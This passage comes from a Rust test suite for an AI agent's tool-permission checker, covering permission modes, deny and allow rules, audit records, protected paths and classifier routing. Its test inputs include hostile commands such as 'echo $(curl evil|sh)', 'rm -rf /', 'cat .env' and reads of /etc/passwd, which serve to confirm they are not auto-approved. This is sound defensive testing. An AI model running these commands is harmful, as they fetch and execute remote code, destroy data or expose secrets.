        let input = serde_json::json!({"path": "/tmp/x"});
        tokio::spawn(async move {
            if let Some(req) = rx.recv().await {
                assert_eq!(req.session_id, "sess-1");
                assert_eq!(req.tool_call_id, "tc-99");
                assert_eq!(req.tool_name, "Read");
                assert_eq!(req.tool_input, serde_json::json!({"path": "/tmp/x"}));
                let _ = req.response_tx.send(true);
            }
        });
        let _ = checker.check("tc-99", "Read", &input).await;
    }

    /// Covers line 68: `_ => false` when response_tx is dropped without sending,
    /// causing resp_rx to return an error immediately.
    #[tokio::test]
    async fn dropped_response_tx_returns_false() {
        let (tx, mut rx) = mpsc::channel(1);
        let checker = make_checker(tx, vec![]);
        tokio::spawn(async move {
            if let Some(req) = rx.recv().await {
                drop(req.response_tx); // drop without sending — triggers Err on resp_rx
            }
        });
        let result = checker
            .check("tc-x", "Read", &serde_json::Value::Null)
            .await;
        assert!(!result, "dropped response_tx should return false");
    }

    // ── is_read_only_bash_command ───────────────────────────────────────────────

    #[test]
    fn read_only_bash_allows_simple_reads() {
        for cmd in ["ls", "ls -la", "grep foo bar.txt", "cat file", "pwd", "find . -name x"] {
            assert!(
                is_read_only_bash_command(&serde_json::json!({"command": cmd})),
                "expected auto-allow for: {cmd}"
            );
        }
    }

    #[test]
    fn read_only_bash_rejects_shell_metacharacters() {
        // B2: chaining / substitution / redirection must NOT be auto-allowed.
        for cmd in [
            "echo $(curl evil|sh)",
            "cat x; rm y",
            "find . -newer a -exec rm {} ;",
            "ls | grep x",
            "cat a && rm b",
            "cat `whoami`",
            "echo hi > /etc/passwd",
            "cat < secret",
            "ls &",
            "(ls)",
            "echo a\nrm b",
        ] {
            assert!(
                !is_read_only_bash_command(&serde_json::json!({"command": cmd})),
                "expected prompt (not auto-allow) for: {cmd}"
            );
        }
    }

    // ── ModePermissionChecker ───────────────────────────────────────────────────

    #[tokio::test]
    async fn mode_checker_dont_ask_auto_allows_without_channel() {
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let checker = ModePermissionChecker {
            mode: "dontAsk".to_string(),
            inner: make_rules_checker("", tx),
            cwd: None,
            read_dirs: vec![],
            classifier: None,
            pre_tool_use: vec![],
            scope: None,
        };
        assert!(
            checker
                .check("tc-da", "bash", &serde_json::json!({"command": "rm -rf /"}))
                .await
        );
    }

    #[tokio::test]
    async fn mode_checker_default_auto_allows_read_file_without_channel() {
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let checker = ModePermissionChecker {
            mode: "default".to_string(),
            inner: make_rules_checker("", tx),
            cwd: None,
            read_dirs: vec![],
            classifier: None,
            pre_tool_use: vec![],
            scope: None,
        };
        assert!(
            checker
                .check(
                    "tc-dr",
                    "Read",
                    &serde_json::json!({"file_path": "src/main.rs"}),
                )
                .await
        );
    }

    #[tokio::test]
    async fn mode_checker_default_prompts_bash_via_channel() {
        let (tx, mut rx) = mpsc::channel(1);
        let checker = ModePermissionChecker {
            mode: "default".to_string(),
            inner: make_rules_checker("", tx),
            cwd: None,
            read_dirs: vec![],
            classifier: None,
            pre_tool_use: vec![],
            scope: None,
        };
        tokio::spawn(async move {
            if let Some(req) = rx.recv().await {
                let _ = req.response_tx.send(true);
            }
        });
        assert!(
            checker
                .check("tc-db", "Bash", &serde_json::json!({"command": "pwd"}))
                .await
        );
    }

    #[tokio::test]
    async fn mode_checker_accept_edits_auto_allows_write_file() {
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let checker = ModePermissionChecker {
            mode: "acceptEdits".to_string(),
            inner: make_rules_checker("", tx),
            cwd: None,
            read_dirs: vec![],
            classifier: None,
            pre_tool_use: vec![],
            scope: None,
        };
        assert!(
            checker
                .check("tc-ae", "write_file", &serde_json::json!({"path": "/tmp/x"}))
                .await
        );
    }

    #[tokio::test]
    async fn mode_checker_accept_edits_prompts_write_bash_via_channel() {
        // A write/side-effect bash command (not read-only) still prompts.
        let (tx, mut rx) = mpsc::channel(1);
        let checker = ModePermissionChecker {
            mode: "acceptEdits".to_string(),
            inner: make_rules_checker("", tx),
            cwd: None,
            read_dirs: vec![],
            classifier: None,
            pre_tool_use: vec![],
            scope: None,
        };
        tokio::spawn(async move {
            if let Some(req) = rx.recv().await {
                let _ = req.response_tx.send(true);
            }
        });
        assert!(
            checker
                .check("tc-ab", "bash", &serde_json::json!({"command": "touch out.txt"}))
                .await
        );
    }

    #[tokio::test]
    async fn mode_checker_accept_edits_auto_allows_read() {
        // acceptEdits inherits default's read-only auto-allow. Dropping the
        // receiver means any attempt to prompt would close the channel and deny,
        // so a `true` result proves read_file was auto-allowed without prompting.
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let checker = ModePermissionChecker {
            mode: "acceptEdits".to_string(),
            inner: make_rules_checker("", tx),
            cwd: None,
            read_dirs: vec![],
            classifier: None,
            pre_tool_use: vec![],
            scope: None,
        };
        assert!(
            checker
                .check("tc-ar", "read_file", &serde_json::json!({"path": "src/main.rs"}))
                .await
        );
    }

    #[tokio::test]
    async fn mode_checker_accept_edits_auto_allows_read_only_bash() {
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let checker = ModePermissionChecker {
            mode: "acceptEdits".to_string(),
            inner: make_rules_checker("", tx),
            cwd: None,
            read_dirs: vec![],
            classifier: None,
            pre_tool_use: vec![],
            scope: None,
        };
        assert!(
            checker
                .check("tc-arb", "bash", &serde_json::json!({"command": "ls"}))
                .await
        );
    }

    #[tokio::test]
    async fn mode_checker_plan_denies_write_file() {
        let (tx, _rx) = mpsc::channel(1);
        let checker = ModePermissionChecker {
            mode: "plan".to_string(),
            inner: make_rules_checker("", tx),
            cwd: None,
            read_dirs: vec![],
            classifier: None,
            pre_tool_use: vec![],
            scope: None,
        };
        assert!(
            !checker
                .check("tc-pl", "write_file", &serde_json::json!({"path": "/tmp/x"}))
                .await
        );
    }

    #[tokio::test]
    async fn mode_checker_plan_denies_gh() {
        let (tx, _rx) = mpsc::channel(1);
        let checker = ModePermissionChecker {
            mode: "plan".to_string(),
            inner: make_rules_checker("", tx),
            cwd: None,
            read_dirs: vec![],
            classifier: None,
            pre_tool_use: vec![],
            scope: None,
        };
        assert!(
            !checker
                .check("tc-gh", "gh", &serde_json::json!({"command": "pr create"}))
                .await,
            "gh must be denied in plan mode"
        );
    }

    #[tokio::test]
    async fn mode_checker_plan_auto_allows_read() {
        // plan is read-only exploration: reads must not prompt. Dropped receiver
        // means a `true` result proves auto-allow (a prompt would close → deny).
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let checker = ModePermissionChecker {
            mode: "plan".to_string(),
            inner: make_rules_checker("", tx),
            cwd: None,
            read_dirs: vec![],
            classifier: None,
            pre_tool_use: vec![],
            scope: None,
        };
        assert!(
            checker
                .check("tc-pr", "read_file", &serde_json::json!({"path": "src/main.rs"}))
                .await
        );
    }

    #[tokio::test]
    async fn mode_checker_plan_auto_allows_read_only_bash() {
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let checker = ModePermissionChecker {
            mode: "plan".to_string(),
            inner: make_rules_checker("", tx),
            cwd: None,
            read_dirs: vec![],
            classifier: None,
            pre_tool_use: vec![],
            scope: None,
        };
        assert!(
            checker
                .check("tc-prb", "bash", &serde_json::json!({"command": "ls"}))
                .await
        );
    }

    #[tokio::test]
    async fn mode_checker_plan_denies_write_bash() {
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let checker = ModePermissionChecker {
            mode: "plan".to_string(),
            inner: make_rules_checker("", tx),
            cwd: None,
            read_dirs: vec![],
            classifier: None,
            pre_tool_use: vec![],
            scope: None,
        };
        assert!(
            !checker
                .check("tc-pwb", "bash", &serde_json::json!({"command": "rm file"}))
                .await
        );
    }

    #[tokio::test]
    async fn mode_checker_dont_ask_respects_deny_rule() {
        // Deny always wins, even in dontAsk.
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let checker = ModePermissionChecker {
            mode: "dontAsk".to_string(),
            inner: make_rules_checker("deny_commands: rm -rf", tx),
            cwd: None,
            read_dirs: vec![],
            classifier: None,
            pre_tool_use: vec![],
            scope: None,
        };
        assert!(
            !checker
                .check("tc-dad", "bash", &serde_json::json!({"command": "rm -rf /"}))
                .await
        );
    }

    #[tokio::test]
    async fn mode_checker_accept_edits_respects_deny_rule() {
        // An edit on a Deny-listed path is rejected even though acceptEdits would
        // otherwise auto-allow edits.
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let checker = ModePermissionChecker {
            mode: "acceptEdits".to_string(),
            inner: make_rules_checker("deny_paths: secrets/**", tx),
            cwd: None,
            read_dirs: vec![],
            classifier: None,
            pre_tool_use: vec![],
            scope: None,
        };
        assert!(
            !checker
                .check("tc-aed", "write_file", &serde_json::json!({"path": "secrets/x.env"}))
                .await
        );
    }

    #[test]
    fn build_mode_permission_checker_none_for_bypass() {
        let (tx, _rx) = mpsc::channel(1);
        let checker = build_mode_permission_checker(
            "bypassPermissions",
            "sess-1",
            &tx,
            vec![],
            Arc::new(PermissionRules::default()),
            vec![],
            Arc::new(Mutex::new(Vec::new())),
            Arc::new(Mutex::new(None)),
            PermissionExtras::default(),
        );
        assert!(checker.is_none());
    }

    // ── eval_tool_policies ────────────────────────────────────────────────────

    use crate::session_store::{PolicyAction, ToolPolicy};

    fn make_policy(tool: &str, pattern: &str, action: PolicyAction) -> ToolPolicy {
        ToolPolicy {
            tool: tool.to_string(),
            path_pattern: pattern.to_string(),
            action,
        }
    }

    #[test]
    fn no_policies_returns_none() {
        let result = eval_tool_policies(&[], "write_file", &serde_json::json!({"path": "/workspace/foo.rs"}));
        assert_eq!(result, None);
    }

    #[test]
    fn no_matching_tool_returns_none() {
        let policies = vec![make_policy("read_file", "/workspace/**", PolicyAction::Allow)];
        let result = eval_tool_policies(&policies, "write_file", &serde_json::json!({"path": "/workspace/foo.rs"}));
        assert_eq!(result, None);
    }

    #[test]
    fn matching_allow_policy_returns_allow() {
        let policies = vec![make_policy("write_file", "/workspace/**", PolicyAction::Allow)];
        let result = eval_tool_policies(&policies, "write_file", &serde_json::json!({"path": "/workspace/src/main.rs"}));
        assert_eq!(result, Some(PolicyAction::Allow));
    }

    #[test]
    fn matching_deny_policy_returns_deny() {
        let policies = vec![make_policy("write_file", "/workspace/**", PolicyAction::Deny)];
        let result = eval_tool_policies(&policies, "write_file", &serde_json::json!({"path": "/workspace/src/main.rs"}));
        assert_eq!(result, Some(PolicyAction::Deny));
    }

    #[test]
    fn policy_tool_name_normalized_on_both_sides() {
        // B14: policy authored as "Bash" matches an incoming "bash" invocation.
        let policies = vec![make_policy("Bash", "**", PolicyAction::Deny)];
        let result = eval_tool_policies(
            &policies,
            "bash",
            &serde_json::json!({"command": "rm -rf /"}),
        );
        assert_eq!(result, Some(PolicyAction::Deny));
    }

    #[test]
    fn deny_beats_allow_when_both_match() {
        let policies = vec![
            make_policy("write_file", "/workspace/**", PolicyAction::Allow),
            make_policy("write_file", "/workspace/secrets/**", PolicyAction::Deny),
        ];
        let result = eval_tool_policies(&policies, "write_file", &serde_json::json!({"path": "/workspace/secrets/key.txt"}));
        assert_eq!(result, Some(PolicyAction::Deny));
    }

    #[tokio::test]
    async fn rules_checker_tool_policy_deny_returns_false() {
        let (tx, _rx) = mpsc::channel(1);
        let inner = make_checker(tx, vec![]);
        let checker = RulesPermissionChecker {
            rules: Arc::new(crate::permission_rules::PermissionRules::default()),
            tool_policies: vec![make_policy("write_file", "/etc/**", PolicyAction::Deny)],
            inner,
        };
        let result = checker
            .check("tc-p1", "write_file", &serde_json::json!({"path": "/etc/passwd"}))
            .await;
        assert!(!result, "tool policy Deny should reject");
    }

    #[tokio::test]
    async fn rules_checker_tool_policy_allow_returns_true() {
        let (tx, _rx) = mpsc::channel(1);
        let inner = make_checker(tx, vec![]);
        let checker = RulesPermissionChecker {
            rules: Arc::new(crate::permission_rules::PermissionRules::default()),
            tool_policies: vec![make_policy("read_file", "/workspace/**", PolicyAction::Allow)],
            inner,
        };
        let result = checker
            .check("tc-p2", "read_file", &serde_json::json!({"path": "/workspace/main.rs"}))
            .await;
        assert!(result, "tool policy Allow should approve");
    }

    #[tokio::test]
    async fn rules_checker_require_approval_falls_through_to_channel() {
        let (tx, mut rx) = mpsc::channel(1);
        let inner = make_checker(tx, vec![]);
        let checker = RulesPermissionChecker {
            rules: Arc::new(crate::permission_rules::PermissionRules::default()),
            tool_policies: vec![make_policy("write_file", "/tmp/**", PolicyAction::RequireApproval)],
            inner,
        };
        tokio::spawn(async move {
            if let Some(req) = rx.recv().await {
                let _ = req.response_tx.send(true);
            }
        });
        let result = checker
            .check("tc-p3", "write_file", &serde_json::json!({"path": "/tmp/foo.txt"}))
            .await;
        assert!(result, "RequireApproval should fall through to channel (which approved)");
    }

    // ── extract_input_summary ────────────────────────────────────────────────────

    #[test]
    fn input_summary_uses_file_path_field() {
        let input = serde_json::json!({"file_path": "/home/user/file.txt"});
        assert_eq!(extract_input_summary("Read", &input), "/home/user/file.txt");
    }

    #[test]
    fn input_summary_uses_path_field() {
        let input = serde_json::json!({"path": "/home/user/file.txt"});
        assert_eq!(extract_input_summary("Read", &input), "/home/user/file.txt");
    }

    #[test]
    fn input_summary_bash_uses_command_prefix() {
        let input = serde_json::json!({"command": "cargo test --workspace"});
        assert_eq!(
            extract_input_summary("bash", &input),
            "cargo test --workspace"
        );
    }

    #[test]
    fn input_summary_bash_truncates_at_60_chars() {
        let long_cmd = "a".repeat(100);
        let input = serde_json::json!({"command": long_cmd});
        let summary = extract_input_summary("Bash", &input);
        assert_eq!(summary.len(), 60);
    }

    #[test]
    fn input_summary_fallback_is_tool_name() {
        let input = serde_json::json!({"other": "value"});
        assert_eq!(extract_input_summary("SomeTool", &input), "SomeTool");
    }

    #[test]
    fn input_summary_path_takes_priority_over_command() {
        let input = serde_json::json!({"path": "/tmp/x", "command": "do something"});
        assert_eq!(extract_input_summary("bash", &input), "/tmp/x");
    }

    // ── audit recording ──────────────────────────────────────────────────────────

    #[tokio::test]
    async fn auto_allow_records_allowed_outcome() {
        let (tx, _rx) = mpsc::channel(1);
        let buf: AuditBuf = Arc::new(Mutex::new(vec![]));
        let checker =
            make_checker_with_buf(tx, vec!["Read".to_string()], buf.clone());
        let input = serde_json::json!({"path": "/etc/hosts"});
        checker.check("tc-1", "Read", &input).await;
        let entries = buf.lock().unwrap();
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].tool, "Read");
        assert_eq!(entries[0].outcome, AuditOutcome::Allowed);
        assert_eq!(entries[0].input_summary, "/etc/hosts");
    }

    #[tokio::test]
    async fn channel_approve_records_required_then_approved() {
        let (tx, mut rx) = mpsc::channel(1);
        let buf: AuditBuf = Arc::new(Mutex::new(vec![]));
        let checker = make_checker_with_buf(tx, vec![], buf.clone());
        tokio::spawn(async move {
            if let Some(req) = rx.recv().await {
                let _ = req.response_tx.send(true);
            }
        });
        checker
            .check("tc-2", "Write", &serde_json::json!({"path": "/tmp/out"}))
            .await;
        let entries = buf.lock().unwrap();
        assert_eq!(entries.len(), 2);
        assert_eq!(entries[0].outcome, AuditOutcome::RequiredApproval);
        assert_eq!(entries[1].outcome, AuditOutcome::ApprovedByUser);
        assert_eq!(entries[1].input_summary, "/tmp/out");
    }

    #[tokio::test]
    async fn channel_deny_records_required_then_denied() {
        let (tx, mut rx) = mpsc::channel(1);
        let buf: AuditBuf = Arc::new(Mutex::new(vec![]));
        let checker = make_checker_with_buf(tx, vec![], buf.clone());
        tokio::spawn(async move {
            if let Some(req) = rx.recv().await {
                let _ = req.response_tx.send(false);
            }
        });
        checker
            .check("tc-3", "Bash", &serde_json::json!({"command": "rm -rf /"}))
            .await;
        let entries = buf.lock().unwrap();
        assert_eq!(entries.len(), 2);
        assert_eq!(entries[0].outcome, AuditOutcome::RequiredApproval);
        assert_eq!(entries[1].outcome, AuditOutcome::DeniedByUser);
    }

    #[tokio::test]
    async fn closed_channel_records_denied_by_user() {
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let buf: AuditBuf = Arc::new(Mutex::new(vec![]));
        let checker = make_checker_with_buf(tx, vec![], buf.clone());
        checker
            .check("tc-4", "Edit", &serde_json::Value::Null)
            .await;
        let entries = buf.lock().unwrap();
        assert!(entries.iter().any(|e| e.outcome == AuditOutcome::DeniedByUser));
    }

    // ── RulesPermissionChecker: static rules audit ────────────────────────────

    #[tokio::test]
    async fn rules_checker_static_deny_returns_false_and_records_denied() {
        use crate::permission_rules::PermissionRules;
        let rules = PermissionRules::parse("## Permissions\ndeny_paths: /etc/**\n");
        let (tx, _rx) = mpsc::channel(1);
        let buf: AuditBuf = Arc::new(Mutex::new(vec![]));
        let inner = make_checker_with_buf(tx, vec![], buf.clone());
        let checker = RulesPermissionChecker {
            rules: Arc::new(rules),
            tool_policies: vec![],
            inner,
        };
        let result = checker
            .check("tc-sd", "write_file", &serde_json::json!({"path": "/etc/passwd"}))
            .await;
        assert!(!result, "static Deny must return false");
        let entries = buf.lock().unwrap();
        assert_eq!(entries.len(), 1, "must record one audit entry");
        assert_eq!(entries[0].outcome, AuditOutcome::Denied);
        assert_eq!(entries[0].input_summary, "/etc/passwd");
        assert_eq!(entries[0].tool, "write_file");
    }

    #[tokio::test]
    async fn rules_checker_static_allow_returns_true_and_records_allowed() {
        use crate::permission_rules::PermissionRules;
        let rules = PermissionRules::parse("## Permissions\nallow_paths: /workspace/**\n");
        let (tx, _rx) = mpsc::channel(1);
        let buf: AuditBuf = Arc::new(Mutex::new(vec![]));
        let inner = make_checker_with_buf(tx, vec![], buf.clone());
        let checker = RulesPermissionChecker {
            rules: Arc::new(rules),
            tool_policies: vec![],
            inner,
        };
        let result = checker
            .check("tc-sa", "read_file", &serde_json::json!({"path": "/workspace/main.rs"}))
            .await;
        assert!(result, "static Allow must return true");
        let entries = buf.lock().unwrap();
        assert_eq!(entries.len(), 1, "must record one audit entry");
        assert_eq!(entries[0].outcome, AuditOutcome::Allowed);
        assert_eq!(entries[0].input_summary, "/workspace/main.rs");
        assert_eq!(entries[0].tool, "read_file");
    }

    // ── eval_tool_policies: RequireApproval-only case ─────────────────────────

    #[test]
    fn eval_tool_policies_require_approval_only_returns_some() {
        let policies = vec![make_policy("write_file", "/tmp/**", PolicyAction::RequireApproval)];
        let result = eval_tool_policies(
            &policies,
            "write_file",
            &serde_json::json!({"path": "/tmp/foo.txt"}),
        );
        assert_eq!(result, Some(PolicyAction::RequireApproval));
    }

    // ── tool-policy audit gap (known) ─────────────────────────────────────────

    #[tokio::test]
    async fn rules_checker_tool_policy_deny_records_denied_audit() {
        let (tx, _rx) = mpsc::channel(1);
        let buf: AuditBuf = Arc::new(Mutex::new(vec![]));
        let inner = make_checker_with_buf(tx, vec![], buf.clone());
        let checker = RulesPermissionChecker {
            rules: Arc::new(crate::permission_rules::PermissionRules::default()),
            tool_policies: vec![make_policy("write_file", "/etc/**", PolicyAction::Deny)],
            inner,
        };
        checker
            .check("tc-tpd", "write_file", &serde_json::json!({"path": "/etc/passwd"}))
            .await;
        let entries = buf.lock().unwrap();
        assert_eq!(entries.len(), 1, "tool-policy Deny must record one audit entry");
        assert_eq!(entries[0].outcome, AuditOutcome::Denied);
        assert_eq!(entries[0].tool, "write_file");
        assert_eq!(entries[0].input_summary, "/etc/passwd");
    }

    #[tokio::test]
    async fn rules_checker_tool_policy_allow_records_allowed_audit() {
        let (tx, _rx) = mpsc::channel(1);
        let buf: AuditBuf = Arc::new(Mutex::new(vec![]));
        let inner = make_checker_with_buf(tx, vec![], buf.clone());
        let checker = RulesPermissionChecker {
            rules: Arc::new(crate::permission_rules::PermissionRules::default()),
            tool_policies: vec![make_policy("read_file", "/workspace/**", PolicyAction::Allow)],
            inner,
        };
        checker
            .check("tc-tpa", "read_file", &serde_json::json!({"path": "/workspace/main.rs"}))
            .await;
        let entries = buf.lock().unwrap();
        assert_eq!(entries.len(), 1, "tool-policy Allow must record one audit entry");
        assert_eq!(entries[0].outcome, AuditOutcome::Allowed);
        assert_eq!(entries[0].tool, "read_file");
        assert_eq!(entries[0].input_summary, "/workspace/main.rs");
    }

    // ── RulesPermissionChecker ────────────────────────────────────────────────

    fn make_rules_checker(rules_text: &str, tx: PermissionTx) -> RulesPermissionChecker {
        RulesPermissionChecker {
            rules: Arc::new(PermissionRules::parse(rules_text)),
            tool_policies: vec![],
            inner: make_checker(tx, vec![]),
        }
    }

    /// `Deny` rule → returns false immediately, without consulting the inner checker.
    #[tokio::test]
    async fn rules_deny_returns_false_without_inner() {
        // Deny all bash commands.
        let (tx, rx) = mpsc::channel(1);
        // Drop rx so any inner channel send would return an error — but it should
        // never be reached for a Deny decision.
        drop(rx);
        let checker = make_rules_checker(
            "## Permissions\ndeny_commands: bash\n",
            tx,
        );
        let result = checker
            .check("tc-d1", "bash", &serde_json::json!({"command": "rm -rf /"}))
            .await;
        assert!(!result, "Deny rule must return false");
    }

    /// `Allow` rule → returns true immediately, without consulting the inner checker.
    #[tokio::test]
    async fn rules_allow_returns_true_without_inner() {
        // Allow all read_file calls.
        let (tx, rx) = mpsc::channel(1);
        drop(rx); // inner channel closed — would deny if reached
        let checker = make_rules_checker(
            "## Permissions\nallow_paths: **\n",
            tx,
        );
        let result = checker
            .check(
                "tc-a1",
                "read_file",
                &serde_json::json!({"path": "/home/user/file.txt"}),
            )
            .await;
        assert!(result, "Allow rule must return true");
    }

    /// `Ask` rule → delegates to the inner `ChannelPermissionChecker`.
    #[tokio::test]
    async fn rules_ask_delegates_to_inner_checker_allow() {
        // Empty rules → all decisions are Ask.
        let (tx, mut rx) = mpsc::channel::<PermissionReq>(1);
        tokio::spawn(async move {
            if let Some(req) = rx.recv().await {
                let _ = req.response_tx.send(true);
            }
        });
        let checker = make_rules_checker("", tx);
        let result = checker
            .check("tc-q1", "write_file", &serde_json::json!({"path": "/tmp/x"}))
            .await;
        assert!(result, "Ask must forward to inner and return its allow decision");
    }

    /// `Ask` rule → inner returns deny.
    #[tokio::test]
    async fn rules_ask_delegates_to_inner_checker_deny() {
        let (tx, mut rx) = mpsc::channel::<PermissionReq>(1);
        tokio::spawn(async move {
            if let Some(req) = rx.recv().await {
                let _ = req.response_tx.send(false);
            }
        });
        let checker = make_rules_checker("", tx);
        let result = checker
            .check("tc-q2", "write_file", &serde_json::json!({"path": "/tmp/x"}))
            .await;
        assert!(!result, "Ask must forward to inner and return its deny decision");
    }

    /// Deny takes precedence even when an allow rule also matches.
    #[tokio::test]
    async fn rules_deny_beats_allow() {
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let checker = make_rules_checker(
            "## Permissions\nallow_paths: **\ndeny_paths: /etc/**\n",
            tx,
        );
        let result = checker
            .check(
                "tc-db",
                "read_file",
                &serde_json::json!({"path": "/etc/passwd"}),
            )
            .await;
        assert!(!result, "Deny must beat Allow");
    }

    // ── Protected paths / read containment / auto mode ────────────────────────

    struct MockClassifier(ClassifierVerdict);
    impl SafetyClassifier for MockClassifier {
        fn classify<'a>(
            &'a self,
            _tool_name: &'a str,
            _tool_input: &'a Value,
        ) -> std::pin::Pin<Box<dyn std::future::Future<Output = ClassifierVerdict> + Send + 'a>>
        {
            let v = self.0;
            Box::pin(async move { v })
        }
    }

    fn full_checker(
        mode: &str,
        tx: PermissionTx,
        cwd: Option<&str>,
        read_dirs: Vec<String>,
        classifier: Option<Arc<dyn SafetyClassifier>>,
    ) -> ModePermissionChecker {
        ModePermissionChecker {
            mode: mode.to_string(),
            inner: make_rules_checker("", tx),
            cwd: cwd.map(String::from),
            read_dirs,
            classifier,
            pre_tool_use: vec![],
        }
    }

    #[tokio::test]
    async fn protected_path_not_auto_allowed_even_in_dontask() {
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let checker = full_checker("dontAsk", tx, None, vec![], None);
        // .env routes to the (dropped) channel instead of auto-allowing → false.
        assert!(
            !checker
                .check("tc", "write_file", &serde_json::json!({"path": ".env"}))
                .await,
            "protected .env must never be auto-approved"
        );
    }

    #[tokio::test]
    async fn normal_path_still_auto_allowed_in_dontask() {
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let checker = full_checker("dontAsk", tx, None, vec![], None);
        assert!(
            checker
                .check("tc", "write_file", &serde_json::json!({"path": "src/main.rs"}))
                .await
        );
    }

    #[tokio::test]
    async fn protected_bash_cat_env_not_auto_allowed() {
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let checker = full_checker("default", tx, None, vec![], None);
        assert!(
            !checker
                .check("tc", "bash", &serde_json::json!({"command": "cat .env"}))
                .await,
            "`cat .env` references a protected path → must prompt"
        );
    }

    #[tokio::test]
    async fn read_inside_cwd_allowed_outside_prompts() {
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let checker = full_checker("default", tx, Some("/work"), vec![], None);
        assert!(
            checker
                .check("tc", "read_file", &serde_json::json!({"path": "/work/src/a.rs"}))
                .await
        );
        let (tx2, rx2) = mpsc::channel(1);
        drop(rx2);
        let checker2 = full_checker("default", tx2, Some("/work"), vec![], None);
        assert!(
            !checker2
                .check("tc", "read_file", &serde_json::json!({"path": "/etc/passwd"}))
                .await,
            "reads outside cwd must not be auto-allowed"
        );
    }

    #[tokio::test]
    async fn read_only_bash_inside_cwd_allowed_outside_prompts() {
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let checker = full_checker("default", tx, Some("/work"), vec![], None);
        assert!(
            checker
                .check("tc", "bash", &serde_json::json!({"command": "cat src/a.rs"}))
                .await,
            "read-only bash inside cwd must still auto-allow"
        );
        let (tx2, rx2) = mpsc::channel(1);
        drop(rx2);
        let checker2 = full_checker("default", tx2, Some("/work"), vec![], None);
        assert!(
            !checker2
                .check("tc", "bash", &serde_json::json!({"command": "cat /etc/passwd"}))
                .await,
            "read-only bash outside cwd must not be auto-allowed"
        );
    }

    #[test]
    fn extract_paths_find_exec_and_grep_file_flags_fail_closed() {
        // find that executes/writes is never read-only → None (caller prompts)
        assert_eq!(extract_read_only_bash_paths("find . -exec rm {} ;"), None);
        assert_eq!(extract_read_only_bash_paths("find . -delete"), None);
        // grep reading a patterns file, or with a flag-supplied pattern → None
        assert_eq!(extract_read_only_bash_paths("grep -f /etc/patterns ."), None);
        assert_eq!(extract_read_only_bash_paths("grep --file=/etc/p ."), None);
        assert_eq!(extract_read_only_bash_paths("grep -e foo bar"), None);
        // benign forms still parse: every leading find root is checked
        assert_eq!(
            extract_read_only_bash_paths("find /etc -name x"),
            Some(vec!["/etc"])
        );
        assert_eq!(
            extract_read_only_bash_paths("find . sub -type f"),
            Some(vec![".", "sub"])
        );
        assert_eq!(
            extract_read_only_bash_paths("grep pattern src/a.rs"),
            Some(vec!["src/a.rs"])
        );
    }

    #[tokio::test]
    async fn read_in_additional_directory_allowed() {
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let checker = full_checker("default", tx, Some("/work"), vec!["/extra".into()], None);
        assert!(
            checker
                .check("tc", "read_file", &serde_json::json!({"path": "/extra/lib.rs"}))
                .await,
            "reads in permissions.additionalDirectories must be auto-allowed"
        );
    }

    #[tokio::test]
    async fn read_escaping_cwd_via_dotdot_prompts() {
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let checker = full_checker("default", tx, Some("/work"), vec![], None);
        assert!(
            !checker
                .check("tc", "read_file", &serde_json::json!({"path": "../etc/passwd"}))
                .await,
            "../ escaping cwd must not be auto-allowed"
        );
    }

    #[tokio::test]
    async fn auto_mode_read_only_auto_allows() {
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let checker = full_checker("auto", tx, None, vec![], None);
        assert!(
            checker
                .check("tc", "read_file", &serde_json::json!({"path": "a.rs"}))
                .await
        );
    }

    #[tokio::test]
    async fn auto_mode_classifier_allow_and_deny() {
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let allow = full_checker(
            "auto",
            tx,
            None,
            vec![],
            Some(Arc::new(MockClassifier(ClassifierVerdict::Allow))),
        );
        assert!(
            allow
                .check("tc", "write_file", &serde_json::json!({"path": "a.rs", "content": "x"}))
                .await
        );

        let (tx2, rx2) = mpsc::channel(1);
        drop(rx2);
        let deny = full_checker(
            "auto",
            tx2,
            None,
            vec![],
            Some(Arc::new(MockClassifier(ClassifierVerdict::Deny))),
        );
        assert!(
            !deny
                .check("tc", "write_file", &serde_json::json!({"path": "a.rs", "content": "x"}))
                .await
        );
    }

    #[tokio::test]
    async fn auto_mode_prompt_verdict_and_no_classifier_route_to_channel() {
        for classifier in [
            Some(Arc::new(MockClassifier(ClassifierVerdict::Prompt)) as Arc<dyn SafetyClassifier>),
            None,
        ] {
            let (tx, rx) = mpsc::channel(1);
            drop(rx);
            let checker = full_checker("auto", tx, None, vec![], classifier);
            assert!(
                !checker
                    .check("tc", "write_file", &serde_json::json!({"path": "a.rs", "content": "x"}))
                    .await,
                "Prompt/None must route to the interactive channel (dropped rx → false)"
            );
        }
    }

    #[tokio::test]
    async fn check_tool_permission_auto_mode_uses_classifier_from_extras() {
        let (tx, rx) = mpsc::channel(1);
        drop(rx);
        let extras = PermissionExtras {
            classifier: Some(Arc::new(MockClassifier(ClassifierVerdict::Deny))),
            ..PermissionExtras::default()
        };
        let allowed = check_tool_permission(
            "auto",
            "sess-1",
            Some(&tx),
            &[],
            PermissionRules::default(),
            &[],
            "tc",
            "write_file",
            &serde_json::json!({"path": "a.rs", "content": "x"}),
            Arc::new(Mutex::new(vec![])),
            extras,
        )
        .await;
        assert!(
            !allowed,
            "auto mode must consult the classifier passed via PermissionExtras"
        );
    }

    fn pre_hook(matcher: &str, command: &str) -> Vec<crate::hooks::HookMatcher> {
        vec![crate::hooks::HookMatcher {
            matcher: matcher.to_string(),
            hooks: vec![crate::hooks::HookCommand {
                r#type: "command".into(),
                command: command.to_string(),
                timeout: None,
            }],
        }]
    }

    #[tokio::test]
